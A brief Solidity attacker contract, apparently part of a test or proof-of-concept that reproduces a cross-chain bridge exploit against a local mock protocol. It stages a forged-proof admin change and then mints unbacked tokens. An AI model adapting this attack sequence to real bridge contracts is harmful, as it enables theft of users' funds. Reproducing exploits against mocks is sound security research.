// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "./HyperbridgeForgedProofMintProtocolMock.sol";

contract HyperbridgeForgedProofMintAttacker {
    HyperbridgeForgedProofMintProtocolMock public immutable protocol;

    constructor(address target) {
        protocol = HyperbridgeForgedProofMintProtocolMock(target);
    }

    function stageExploit() external {
        protocol.stageForgedProofAdminChange();
    }

    function completeExploit() external {
        protocol.mintUnbackedToken();
    }
}
